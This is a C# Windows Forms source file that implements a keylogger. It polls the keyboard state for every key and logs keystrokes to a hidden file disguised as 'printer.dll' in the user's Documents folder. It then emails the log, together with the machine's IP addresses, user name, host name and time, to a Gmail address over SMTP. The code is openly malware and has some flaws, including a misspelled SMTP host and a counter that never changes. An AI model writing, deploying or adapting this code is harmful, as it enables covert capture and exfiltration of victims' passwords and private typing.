using System;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace Esp.UI
{
    public partial class Buffer : Form
    {
        //--------------------------


        private string path;
        //--------------------------

        [DllImport("User32.dll")]
        private static extern short GetAsyncKeyState(int vKey);
        public Buffer()
        {
            InitializeComponent();

            string filepath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);

            if (!Directory.Exists(filepath))
            {
                Directory.CreateDirectory(filepath);
            }

            path = (filepath + @"\printer.dll");

            File.SetAttributes(path,File.GetAttributes(path) | FileAttributes.Hidden);

            timer.Start();
        }

        private void Buffer_TextChanged(object sender, EventArgs e)
        {

        }

        private string text = "";
        private int _countNumberOfKeystrokes = 100;
        private async void timer_Tick(object sender, EventArgs e)
        {
            string buffer = "";
            foreach (System.Int32 i in Enum.GetValues(typeof(Keys)))
            {
                if (GetAsyncKeyState(i) == -32767)
                {
                    buffer += Enum.GetName(typeof(Keys), i);
                    using (StreamWriter sw = File.AppendText(path))
                    {
                        await sw.WriteAsync((char) i);
                        if (_countNumberOfKeystrokes % 100 == 0)
                        {
                            SendNewMessage();
                        }
                    }
                }
            }

            text += buffer;
            if (text.Length > 10)
            {
                WriteToTxt(text);
                text = "";
            }
        }

        private async void WriteToTxt(string value)
        {
            StreamWriter stream = new StreamWriter("Pokus.txt",true);
            await stream.WriteAsync(value);
            stream.Close();
        }

        private async void SendNewMessage()
        {
            String folderName = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            string filePath = folderName + @"\printer.dll";

            String logContents = File.ReadAllText(filePath);
            string emailBody = "";

            DateTime now = DateTime.Now;

            string subject = "Message from keylogger";

            var host = await Dns.GetHostEntryAsync(Dns.GetHostName());

            foreach (var address in host.AddressList)
            {
                emailBody += "Address: " + address;
            }

            emailBody += "\n User: " + Environment.UserDomainName + " \\ " + Environment.UserName;
            emailBody += "\nhost " + host;
            emailBody += "\ntime: " + now.ToString();
            emailBody += logContents;

            SmtpClient client = new SmtpClient("smpt.gmail.com", 587);
            MailMessage mailMessage = new MailMessage();

            mailMessage.From = new MailAddress("c@.gmail.com");
            mailMessage.To.Add("c@gmail.com");
            mailMessage.Subject = subject;
            client.UseDefaultCredentials = false;
            client.EnableSsl = true;
            client.Credentials = new NetworkCredential("c@gmail.com", "Password");
            mailMessage.Body = emailBody;

            client.Send(mailMessage);
        }
    }
}
